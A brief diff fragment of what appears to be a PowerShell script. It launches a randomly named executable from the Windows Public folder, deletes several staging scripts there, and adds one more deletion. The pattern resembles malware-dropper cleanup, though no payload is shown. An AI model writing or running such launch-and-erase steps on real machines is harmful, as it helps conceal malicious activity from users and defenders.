@@ -9,3 +9,4 @@ Start-Process "C:\Users\Public\c723561.exe"
 
 Remove-Item C:\Users\Public\sprint.ps1
 Remove-Item C:\Users\Public\silly.ps1
+Remove-Item C:\Users\Public\SED.ps1
